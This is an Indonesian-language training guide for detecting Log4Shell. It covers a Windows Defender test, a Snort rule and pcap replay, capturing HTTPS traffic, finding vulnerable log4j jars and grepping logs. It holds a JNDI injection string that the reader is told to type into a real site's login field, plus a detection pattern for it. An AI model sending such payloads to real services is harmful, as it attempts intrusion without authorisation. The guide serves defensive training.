# Percobaan Deteksi Log4J

## Uji Deteksi Pada Windows Defender
Windows Defender merupakan antivirus bawaan pada Windows. Uji deteksi ini menggambarkan kemampuan Windows Defender untuk mendeteksi file eksploitasi Log4j.

- Buka URL, copy isi dari file tersebut ke dalam notepad https://raw.githubusercontent.com/cyberkarta/weha/main/WebHacking/DES5-Log4J.md.
- Tunggu hingga Windows Defender bereaksi.

## Uji Deteksi pada Traffic Di Network
Uji deteksi ini menggambarkan kemampuan deteksi Log4j pada Next Gen Firewall, Intrusion Detection System, dan Intrusion Prevention System. 

- Install Snort
```sh
sudo apt install snort
```

- Buat rule di snort
```sh
sudo nano /etc/snort/rules/local.rules

# tambahkan di bagian paling bawah
alert tcp any any -> any any (msg: "Deteksi Log4Shell"; content: "${jndi:ldap://"; sid:202144228)
```

- Download pcap pada folder pcap
```
wget https://github.com/cyberkarta/training-seru/blob/main/Januari%202021/pcap/no_encrypt.pcap?raw=true -qO ga-enkripsi.pcap
```

- Deteksi dari pcap
```sh
sudo snort -c /etc/snort/snort.conf -A console -r ga-enkripsi.pcap -l . -k none 
```

Apakah terdeteksi?


## Uji Deteksi pada Traffic Terenkripsi di Network
Uji deteksi ini menggambarkan kemampuan deteksi Log4j pada Next Gen Firewall, Intrusion Detection System, dan Intrusion Prevention System. 

- Install tcpdump
```sh
sudo apt install tcpdump
```

- Packet capture
```sh
sudo tcpdump -i eth0 port 443 -w ./terenkripsi.pcap
```

- Buka koneksi https, ke Twitter misalkan. Pada kolom login coba masukkan.
```sh
${jndi:ldap://8.8.8.8/a}
```

- Deteksi dengan menggunakan snort
```sh
sudo snort -c /etc/snort/snort.conf -A console -r terenkripsi.pcap -l . -k none
```

Apakah terdeteksi?

## Menemukan Versi Log4j Vulnerable
Bisa menggunakan shell
```sh
sudo find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```

Apakah kamu bisa menemukannya?

## Menemukan Bukti Eksploitasi pada Log4j
Cukup menggunakan shell
```sh
sudo grep -nr '${jndi:' /lokasi-folder-log/
```


## Saran untuk Defender/Ops/Developer
Log4j banyak digunakan, bahkan dalam skala terkecil sekalipun
https://github.com/NCSC-NL/log4shell/tree/main/software

Update ke versi terbaru
- **Java 8**: 2.17.1
- **Java 7**: 2.12.4
- **Java 6**: 2.3.2

Carilah nama software yang digunakan oleh perusahaan kamu, dan lihat list di bawah ini.
https://github.com/NCSC-NL/log4shell/tree/main/software

